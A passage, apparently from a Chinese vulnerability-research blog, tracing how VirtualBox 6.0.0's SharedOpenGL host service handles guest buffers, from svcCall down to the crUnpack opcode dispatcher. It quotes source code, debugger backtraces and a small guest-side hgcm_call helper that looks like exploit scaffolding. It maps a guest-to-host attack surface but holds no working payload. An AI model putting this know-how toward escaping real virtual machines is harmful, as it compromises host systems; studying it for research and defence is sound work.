<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CRVBOXSVCBUFFER_t *pSvcBuffer = svcGetBuffer(iBuffer, 0);</span><br><span class="line">if (!pSvcBuffer)</span><br><span class="line">&#123;</span><br><span class="line">    LogRel((&quot;OpenGL: svcCall(WRITE_READ_BUFFERED): Invalid buffer (%d)\n&quot;, iBuffer));</span><br><span class="line">    rc = VERR_INVALID_PARAMETER;</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint8_t *pBuffer     = (uint8_t *)pSvcBuffer-&gt;pData;</span><br><span class="line">uint32_t cbBuffer    = pSvcBuffer-&gt;uiSize;</span><br><span class="line"></span><br><span class="line">/* Execute the function. */</span><br><span class="line">rc = crVBoxServerClientWrite(u32ClientID, pBuffer, cbBuffer);</span><br></pre></td></tr></table></figure>
<p>通过<code>iBuffer</code>索引获取到了<code>pBuffer</code>以后，传入<code>crVBoxServerClientWrite</code>函数进行处理，我们进入该函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int32_t crVBoxServerClientWrite(uint32_t u32ClientID, uint8_t *pBuffer, uint32_t cbBuffer)</span><br><span class="line">&#123;</span><br><span class="line">    CRClient *pClient=NULL;</span><br><span class="line">    int32_t rc = crVBoxServerClientGet(u32ClientID, &amp;pClient);</span><br></pre></td></tr></table></figure>
<p>该函数首先调用<code>crVBoxServerClientGet</code>获取服务句柄</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int32_t crVBoxServerClientGet(uint32_t u32ClientID, CRClient **ppClient)</span><br><span class="line">&#123;</span><br><span class="line">    CRClient *pClient = NULL;</span><br><span class="line"></span><br><span class="line">    pClient = crVBoxServerClientById(u32ClientID);</span><br><span class="line"></span><br><span class="line">    if (!pClient)</span><br><span class="line">    &#123;</span><br><span class="line">        WARN((&quot;client not found!&quot;));</span><br><span class="line">        *ppClient = NULL;</span><br><span class="line">        return VERR_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!pClient-&gt;conn-&gt;vMajor)</span><br><span class="line">    &#123;</span><br><span class="line">        WARN((&quot;no major version specified for client!&quot;));</span><br><span class="line">        *ppClient = NULL;</span><br><span class="line">        return VERR_NOT_SUPPORTED;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>crVBoxServerClientGet</code>函数中，会判断<code>pClient-&gt;conn-&gt;vMajor</code>，如果没有设置则报错。该字段是在<code>svcCall</code>中的<code>SHCRGL_GUEST_FN_SET_VERSION</code>命令中被设置的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        case SHCRGL_GUEST_FN_SET_VERSION:</span><br><span class="line">        &#123;</span><br><span class="line">...........</span><br><span class="line">                /* Fetch parameters. */</span><br><span class="line">                uint32_t vMajor    = paParms[0].u.uint32;</span><br><span class="line">                uint32_t vMinor    = paParms[1].u.uint32;</span><br><span class="line"></span><br><span class="line">                /* Execute the function. */</span><br><span class="line">                rc = crVBoxServerClientSetVersion(u32ClientID, vMajor, vMinor);</span><br></pre></td></tr></table></figure>
<p>因此，在我们使用<code>SHCRGL_GUEST_FN_WRITE_BUFFER</code>之前，应该先使用<code>SHCRGL_GUEST_FN_SET_VERSION</code>设置一下版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int set_version(int client) &#123;</span><br><span class="line">   int rc = hgcm_call(client,SHCRGL_GUEST_FN_SET_VERSION,&quot;%u%u&quot;,CR_PROTOCOL_VERSION_MAJOR,CR_PROTOCOL_VERSION_MINOR);</span><br><span class="line">   if (rc) &#123;</span><br><span class="line">      die(&quot;[-] set_version error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当<code>int32_t rc = crVBoxServerClientGet(u32ClientID, &amp;pClient);</code>执行完获取到服务句柄以后，就继续调用<code>crVBoxServerInternalClientWriteRead</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    pClient-&gt;conn-&gt;pBuffer = pBuffer;</span><br><span class="line">    pClient-&gt;conn-&gt;cbBuffer = cbBuffer;</span><br><span class="line">#ifdef VBOX_WITH_CRHGSMI</span><br><span class="line">    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">    crVBoxServerInternalClientWriteRead(pClient);</span><br><span class="line"></span><br><span class="line">    return VINF_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>crVBoxServerInternalClientWriteRead函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static void crVBoxServerInternalClientWriteRead(CRClient *pClient)</span><br><span class="line">&#123;</span><br><span class="line">............................</span><br><span class="line">    crNetRecv();</span><br><span class="line">    CRASSERT(pClient-&gt;conn-&gt;pBuffer==NULL &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==0);</span><br><span class="line">    CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);</span><br><span class="line"></span><br><span class="line">    crServerServiceClients();</span><br><span class="line">    crStateResetCurrentPointers(&amp;cr_server.current);</span><br><span class="line">..............</span><br></pre></td></tr></table></figure>
<p>先是调用了<code>crNetRecv</code>函数，经过调试，调用链如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; k</span><br><span class="line">#0  0x00007f1b3db9ff05 in _crVBoxHGCMReceiveMessage (conn=0x7f1b1cf408c0) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:1091</span><br><span class="line">#1  0x00007f1b3dba13cc in _crVBoxHGCMPerformReceiveMessage (conn=0x7f1b1cf408c0) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:2425</span><br><span class="line">#2  0x00007f1b3dba141c in crVBoxHGCMRecv () at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/vboxhgcm.c:2482</span><br><span class="line">#3  0x00007f1b3db80238 in crNetRecv () at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/GuestHost/OpenGL/util/net.c:1307</span><br><span class="line">#4  0x00007f1b3ddea7b4 in crVBoxServerInternalClientWriteRead (pClient=0x7f1b1d04da10) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:754</span><br><span class="line">#5  0x00007f1b3ddeacb1 in crVBoxServerClientWrite (u32ClientID=35, pBuffer=0x7f1b1d04e3f0 &quot;hello&quot;, cbBuffer=4096) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:792</span><br><span class="line">#6  0x00007f1b3ddce7c7 in svcCall (callHandle=0x7f1b34c93f50, u32ClientID=35, pvClient=0x7f1b3000a7e0, u32Function=14, cParms=3, paParms=0x7f1b5452d560, tsArrival=29122886987445) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:740</span><br><span class="line">#7  0x00007f1b6e30325a in hgcmServiceThread (pThread=0x7f1b30003c70, pvUser=0x7f1b30003b10) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:708</span><br><span class="line">#8  0x00007f1b6e300090 in hgcmWorkerThreadFunc (hThreadSelf=0x7f1b30004050, pvUser=0x7f1b30003c70) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200</span><br><span class="line">#9  0x00007f1b8ae47aff in rtThreadMain (pThread=0x7f1b30004050, NativeThread=139754983003904, pszThreadName=0x7f1b30004930 &quot;ShCrOpenGL&quot;) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719</span><br><span class="line">#10 0x00007f1b8af8e098 in rtThreadNativeMain (pvArgs=0x7f1b30004050) at /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/posix/thread-posix.cpp:327</span><br><span class="line">#11 0x00007f1b859da6ba in start_thread (arg=0x7f1b3e1e1700) at pthread_create.c:333</span><br><span class="line">#12 0x00007f1b87fd84dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109</span><br></pre></td></tr></table></figure>
<p>可以知道该函数位于<code>src/VBox/GuestHost/OpenGL/util/net.c</code>源文件，虽然这里位于<code>Guset</code>中的客户端源码，但其实是同样编译了一份给Host用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p crNetRecv</span><br><span class="line">$2 = &#123;int (void)&#125; 0x7f1b3db80208 &lt;crNetRecv&gt;</span><br><span class="line">pwndbg&gt; vmmap 0x7f1b3db80208</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7f1b3db6d000     0x7f1b3dbb3000 r-xp    46000 0      /home/sea/Desktop/VirtualBox-6.0.0/out/linux.amd64/debug/bin/VBoxOGLhostcrutil.so +0x13208</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p>可以知道其在<code>VBoxOGLhostcrutil.so</code>库中，从调用链可以知道最终调用到<code>_crVBoxHGCMReceiveMessage</code>这里会出现问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">static void _crVBoxHGCMReceiveMessage(CRConnection *conn)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t len;</span><br><span class="line">    CRVBOXHGCMBUFFER *hgcm_buffer;</span><br><span class="line">    CRMessage *msg;</span><br><span class="line">    CRMessageType cached_type;</span><br><span class="line"></span><br><span class="line">    len = conn-&gt;cbBuffer;</span><br><span class="line">    CRASSERT(len &gt; 0);</span><br><span class="line">    CRASSERT(conn-&gt;pBuffer);</span><br><span class="line"></span><br><span class="line">#ifndef IN_GUEST</span><br><span class="line">    /* Expect only CR_MESSAGE_OPCODES from the guest. */</span><br><span class="line">    AssertPtrReturnVoid(conn-&gt;pBuffer);</span><br><span class="line"></span><br><span class="line">    if (   conn-&gt;cbBuffer &gt;= sizeof(CRMessageHeader)</span><br><span class="line">        &amp;&amp; ((CRMessageHeader*) (conn-&gt;pBuffer))-&gt;type == CR_MESSAGE_OPCODES)</span><br><span class="line">    &#123;</span><br><span class="line">        /* Looks good. */</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        AssertFailed();</span><br><span class="line">        /** @todo Find out if this is the expected cleanup. */</span><br><span class="line">        conn-&gt;cbBuffer = 0;</span><br><span class="line">        conn-&gt;pBuffer  = NULL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
<p>这里会将我们传入的数据转换为<code>CRMessageHeader</code>结构体，然后判断<code>type</code>是否为<code>CR_MESSAGE_OPCODES</code>，如果不是，则报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    CRMessageType          type;</span><br><span class="line">    unsigned int           conn_id;</span><br><span class="line">&#125; CRMessageHeader;</span><br></pre></td></tr></table></figure>
<p>由此可见，我们的数据必须符合要求，当检查通过以后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#ifndef IN_GUEST</span><br><span class="line">    if (conn-&gt;allow_redir_ptr)</span><br><span class="line">    &#123;</span><br><span class="line">#endif</span><br><span class="line">        CRASSERT(conn-&gt;buffer_size &gt;= sizeof(CRMessageRedirPtr));</span><br><span class="line"></span><br><span class="line">        hgcm_buffer = (CRVBOXHGCMBUFFER *) _crVBoxHGCMAlloc( conn ) - 1;</span><br><span class="line">        hgcm_buffer-&gt;len = sizeof(CRMessageRedirPtr);</span><br><span class="line"></span><br><span class="line">        msg = (CRMessage *) (hgcm_buffer + 1);</span><br><span class="line"></span><br><span class="line">        msg-&gt;header.type = CR_MESSAGE_REDIR_PTR;</span><br><span class="line">        msg-&gt;redirptr.pMessage = (CRMessageHeader*) (conn-&gt;pBuffer);</span><br><span class="line">        msg-&gt;header.conn_id = msg-&gt;redirptr.pMessage-&gt;conn_id;</span><br><span class="line"></span><br><span class="line">#if defined(VBOX_WITH_CRHGSMI) &amp;&amp; !defined(IN_GUEST)</span><br><span class="line">        msg-&gt;redirptr.CmdData = conn-&gt;CmdData;</span><br><span class="line">        CRVBOXHGSMI_CMDDATA_ASSERT_CONSISTENT(&amp;msg-&gt;redirptr.CmdData);</span><br><span class="line">        CRVBOXHGSMI_CMDDATA_CLEANUP(&amp;conn-&gt;CmdData);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">        cached_type = msg-&gt;redirptr.pMessage-&gt;type;</span><br><span class="line"></span><br><span class="line">        conn-&gt;cbBuffer = 0;</span><br><span class="line">        conn-&gt;pBuffer  = NULL;</span><br><span class="line">#ifndef IN_GUEST</span><br></pre></td></tr></table></figure>
<p>如果<code>conn-&gt;allow_redir_ptr</code>被设置，会创建一个新的Msg，并设置type为<code>CR_MESSAGE_REDIR_PTR</code>，最后使用<code>    crNetDispatchMessage( g_crvboxhgcm.recv_list, conn, msg, len );</code>将消息挂到消息队列上，由此可见这是一种异步多线程的处理方式。最初调用<code>crNetRecv</code>就是为了将请求放到队列中慢慢处理。<br>回到<code>crVBoxServerInternalClientWriteRead</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crNetRecv();</span><br><span class="line">CRASSERT(pClient-&gt;conn-&gt;pBuffer==NULL &amp;&amp; pClient-&gt;conn-&gt;cbBuffer==0);</span><br><span class="line">CRVBOXHGSMI_CMDDATA_ASSERT_CLEANED(&amp;pClient-&gt;conn-&gt;CmdData);</span><br><span class="line"></span><br><span class="line">crServerServiceClients();</span><br><span class="line">crStateResetCurrentPointers(&amp;cr_server.current);</span><br></pre></td></tr></table></figure>
<p>接下来该调用<code>crServerServiceClients</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">crServerServiceClients(void)</span><br><span class="line">&#123;</span><br><span class="line">    RunQueue *q;</span><br><span class="line"></span><br><span class="line">    q = getNextClient(GL_FALSE); /* don&#x27;t block */</span><br><span class="line">    while (q) </span><br><span class="line">    &#123;</span><br><span class="line">        ClientStatus stat = crServerServiceClient(q);</span><br><span class="line">        if (stat == CLIENT_NEXT &amp;&amp; cr_server.run_queue-&gt;next) &#123;</span><br><span class="line">            /* advance to next client */</span><br><span class="line">            cr_server.run_queue = cr_server.run_queue-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        q = getNextClient(GL_FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上可以看出，他是依次取出请求对象，然后使用函数<code>crServerServiceClient</code>进行处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Process incoming/pending message for the given client (queue entry).</span><br><span class="line"> * \return CLIENT_GONE if this client has gone away/exited,</span><br><span class="line"> *         CLIENT_NEXT if we can advance to the next client</span><br><span class="line"> *         CLIENT_MORE if we have to process more messages for this client. </span><br><span class="line"> */</span><br><span class="line">static ClientStatus</span><br><span class="line">crServerServiceClient(const RunQueue *qEntry)</span><br><span class="line">&#123;</span><br><span class="line">    CRMessage *msg;</span><br><span class="line">    CRConnection *conn;</span><br><span class="line"></span><br><span class="line">    /* set current client pointer */</span><br><span class="line">    cr_server.curClient = qEntry-&gt;client;</span><br><span class="line"></span><br><span class="line">    conn = cr_server.run_queue-&gt;client-&gt;conn;</span><br><span class="line"></span><br><span class="line">    /* service current client as long as we can */</span><br><span class="line">    while (conn &amp;&amp; conn-&gt;type != CR_NO_CONNECTION &amp;&amp;</span><br><span class="line">                 crNetNumMessages(conn) &gt; 0) &#123;</span><br><span class="line">        unsigned int len;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        crDebug(&quot;%d messages on %p&quot;,</span><br><span class="line">                        crNetNumMessages(conn), (void *) conn);</span><br><span class="line">        */</span><br><span class="line"></span><br><span class="line">        /* Don&#x27;t use GetMessage, because we want to do our own crNetRecv() calls</span><br><span class="line">         * here ourself.</span><br><span class="line">         * Note that crNetPeekMessage() DOES remove the message from the queue</span><br><span class="line">         * if there is one.</span><br><span class="line">         */</span><br><span class="line">        len = crNetPeekMessage( conn, &amp;msg );</span><br><span class="line">..........................</span><br><span class="line">        /* Commands get dispatched here */</span><br><span class="line">        crServerDispatchMessage( conn, msg, len );</span><br></pre></td></tr></table></figure>
<p>该函数调用<code>crServerDispatchMessage</code>函数进行opcode的处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This function takes the given message (which should be a buffer of</span><br><span class="line"> * rendering commands) and executes it.</span><br><span class="line"> */</span><br><span class="line">static void</span><br><span class="line">crServerDispatchMessage(CRConnection *conn, CRMessage *msg, int cbMsg)</span><br><span class="line">&#123;</span><br><span class="line">    const CRMessageOpcodes *msg_opcodes;</span><br><span class="line">    int opcodeBytes;</span><br><span class="line">    const char *data_ptr, *data_ptr_end;</span><br><span class="line">...............</span><br><span class="line">    if (msg-&gt;header.type == CR_MESSAGE_REDIR_PTR)</span><br><span class="line">    &#123;</span><br><span class="line">#ifdef VBOX_WITH_CRHGSMI</span><br><span class="line">        pCmdData = &amp;msg-&gt;redirptr.CmdData;</span><br><span class="line">#endif</span><br><span class="line">        msg = (CRMessage *) msg-&gt;redirptr.pMessage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CRASSERT(msg-&gt;header.type == CR_MESSAGE_OPCODES);</span><br><span class="line"></span><br><span class="line">    msg_opcodes = (const CRMessageOpcodes *) msg;</span><br><span class="line">    opcodeBytes = (msg_opcodes-&gt;numOpcodes + 3) &amp; ~0x03;</span><br><span class="line"></span><br><span class="line">#ifdef VBOXCR_LOGFPS</span><br><span class="line">    CRASSERT(cr_server.curClient &amp;&amp; cr_server.curClient-&gt;conn &amp;&amp; cr_server.curClient-&gt;conn-&gt;id == msg-&gt;header.conn_id);</span><br><span class="line">    cr_server.curClient-&gt;conn-&gt;opcodes_count += msg_opcodes-&gt;numOpcodes;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">    data_ptr = (const char *) msg_opcodes + sizeof(CRMessageOpcodes) + opcodeBytes;</span><br><span class="line">    data_ptr_end = (const char *)msg_opcodes + cbMsg; // Pointer to the first byte after message data</span><br><span class="line"></span><br><span class="line">    enmType = crUnpackGetBufferType(data_ptr - 1,             /* first command&#x27;s opcode */</span><br><span class="line">                msg_opcodes-&gt;numOpcodes  /* how many opcodes */);</span><br><span class="line">    switch (enmType)</span><br><span class="line">    &#123;</span><br><span class="line">        case CR_UNPACK_BUFFER_TYPE_GENERIC:</span><br><span class="line">.................</span><br><span class="line">	&#125;</span><br><span class="line">    if (fUnpack)</span><br><span class="line">    &#123;</span><br><span class="line">        crUnpack(data_ptr,                 /* first command&#x27;s operands */</span><br><span class="line">                 data_ptr_end,             /* first byte after command&#x27;s operands*/</span><br><span class="line">                 data_ptr - 1,             /* first command&#x27;s opcode */</span><br><span class="line">                 msg_opcodes-&gt;numOpcodes,  /* how many opcodes */</span><br><span class="line">                 &amp;(cr_server.dispatch));   /* the CR dispatch table */</span><br><span class="line">    &#125;</span><br><span class="line">..................</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>crServerDispatchMessage</code>函数首先检查是否为<code>msg-&gt;header.type == CR_MESSAGE_REDIR_PTR</code>类型的消息，由于前面将原始消息挂在队列时，由于<code>conn-&gt;allow_redir_ptr</code>为true，所以消息确实是被转化为<code>CR_MESSAGE_REDIR_PTR</code>类型的。检查通过后，后面就调用了<code>crUnpack</code>函数来处理<code>Opcode</code>，其中<code>crUnpack</code>函数是通过脚本<code>src/VBox/HostServices/SharedOpenGL/unpacker/unpack.py</code>生成的，可以在编译后的目录<code>out/linux.amd64/debug/obj/VBoxOGLgen/unpack.c</code>里找到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">void crUnpack( const void *data, const void *data_end, const void *opcodes, </span><br><span class="line">        unsigned int num_opcodes, SPUDispatchTable *table )</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    const unsigned char *unpack_opcodes;</span><br><span class="line">    if (table != cr_lastDispatch)</span><br><span class="line">    &#123;</span><br><span class="line">        crSPUCopyDispatchTable( &amp;cr_unpackDispatch, table );</span><br><span class="line">        cr_lastDispatch = table;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unpack_opcodes = (const unsigned char *)opcodes;</span><br><span class="line">    cr_unpackData = (const unsigned char *)data;</span><br><span class="line">    cr_unpackDataEnd = (const unsigned char *)data_end;</span><br><span class="line"></span><br><span class="line">#if defined(CR_UNPACK_DEBUG_OPCODES) || defined(CR_UNPACK_DEBUG_LAST_OPCODES)</span><br><span class="line">    crDebug(&quot;crUnpack: %d opcodes&quot;, num_opcodes);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; num_opcodes; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    </span><br><span class="line">        CRDBGPTR_CHECKZ(writeback_ptr);</span><br><span class="line">        CRDBGPTR_CHECKZ(return_ptr);</span><br><span class="line">    </span><br><span class="line">        /*crDebug(&quot;Unpacking opcode \%d&quot;, *unpack_opcodes);*/</span><br><span class="line">#ifdef CR_UNPACK_DEBUG_PREV_OPCODES</span><br><span class="line">        g_VBoxDbgCrPrevOpcode = *unpack_opcodes;</span><br><span class="line">#endif</span><br><span class="line">        switch( *unpack_opcodes )</span><br><span class="line">        &#123;</span><br><span class="line">			case CR_ALPHAFUNC_OPCODE:</span><br><span class="line">				................</span><br><span class="line">			case CR_ARRAYELEMENT_OPCODE:</span><br><span class="line">				..............</span><br></pre></td></tr></table></figure>
<p>可以看到这是Opcode处理机，根据不同的Opcode，对应不同的操作。在<code>cr_opcodes.h</code>头文件中有这些Opcode的定义。<br>综上分析，<code>SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</code>命令可以将buffer中的opcode进行处理，最后调用<code>crVBoxServerClientRead</code>将结果写回Guest，然后调用<code>svcFreeBuffer</code>对Buffer进行释放。</p>
